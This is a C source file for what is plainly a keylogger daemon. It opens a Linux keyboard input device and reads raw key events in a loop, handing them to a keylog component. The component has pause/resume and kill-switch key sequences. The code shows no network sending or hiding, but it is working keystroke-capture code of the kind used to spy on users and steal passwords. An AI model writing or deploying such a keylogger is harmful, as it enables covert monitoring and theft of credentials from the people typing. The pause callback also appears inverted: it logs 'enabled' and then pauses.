#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

#include "common.h"
#include "input-args.h"
#include "keylog.h"
#include "logger.h"
#include "error.h"

static bool continue_logging = true;

static void start_stop_callback(keylog_t *kl)
{
    if (kl->logging_enabled) {
        logger.info("Key logging enabled");
        kl->pause(kl);
    } else {
        logger.info("Key logging disabled");
        kl->resume(kl);
    }
}

static void kill_callback(keylog_t *kl)
{
    logger.warn("Magic kill switch sequence pressed");

    continue_logging = false;
}

void keyloggerd(cmd_args_t cmd_args)
{
    int keyboard;

    /* Hardcode the input device for now... */
    if ((keyboard = open(cmd_args.keyboard_device, O_RDONLY)) == ERROR) {
        logger.error("Failed to open keyboard device %s: %s",
                     cmd_args.keyboard_device, strerror(errno));
        return;
    }

    keyseq_t kill_seq = {
        .keys = &cmd_args.seq.kill,
        .index = 0,
        .callback = kill_callback,
    };

    keyseq_t pause_resume_seq = {
        .keys = &cmd_args.seq.pause_resume,
        .index = 0,
        .callback = start_stop_callback,
    };

    keylog_t *kl;

    kl = create_keylog(cmd_args);

    kl->install_seq(kl, pause_resume_seq);
    kl->install_seq(kl, kill_seq);

    kl->open(kl);

    ssize_t n;
    struct input_event event;

    while (continue_logging) {
        n = read(keyboard, &event, sizeof(event));

        if (n > 0) {
            kl->process_event(kl, event);
        } else {
            if (errno == EINTR) {
                continue;
            } else {
                logger.error("Failed to read bytes: %s", strerror(errno));
                break;
            }
        }
    }

    kl->close(kl);

    destroy_keylog(kl);
}
